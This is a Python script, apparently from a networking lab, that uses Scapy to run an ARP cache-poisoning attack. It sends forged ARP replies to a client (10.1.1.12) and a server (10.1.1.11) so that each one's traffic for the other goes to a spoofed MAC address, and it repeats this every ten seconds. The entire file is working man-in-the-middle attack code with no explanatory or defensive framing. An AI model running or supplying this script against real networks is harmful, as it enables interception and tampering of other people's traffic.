#!/usr/bin/python3

from scapy.all import *
import time
spoofed_mac = "08:00:27:f7:32:f8"


def spoof_client_cache():
    #client ip
    client_ip = "10.1.1.12"
    client_mac = "08:00:27:02:0a:81"
    #target the server's arp entry in the client's cache
    ip_targ_serv = "10.1.1.11"
    
    ether = Ether(src=spoofed_mac, dst=client_mac)
    arp = ARP(psrc=ip_targ_serv, hwsrc=spoofed_mac,
            pdst=client_ip, hwdst=client_mac)
    arp.op = 2
    frame = ether/arp
    sendp(frame)

def spoof_server_cache():
    server_ip = "10.1.1.11"
    server_mac = "08:00:27:09:fd:f7"
    #target the client's arp entry in the server's cache
    ip_targ_client = "10.1.1.12"
    
    ether = Ether(src=spoofed_mac, dst=server_mac)
    arp = ARP(psrc=ip_targ_client, hwsrc=spoofed_mac,
            pdst=server_ip, hwdst=server_mac)
    arp.op = 2
    frame = ether/arp
    sendp(frame)


while(True):
    spoof_client_cache()
    spoof_server_cache()
    time.sleep(10)

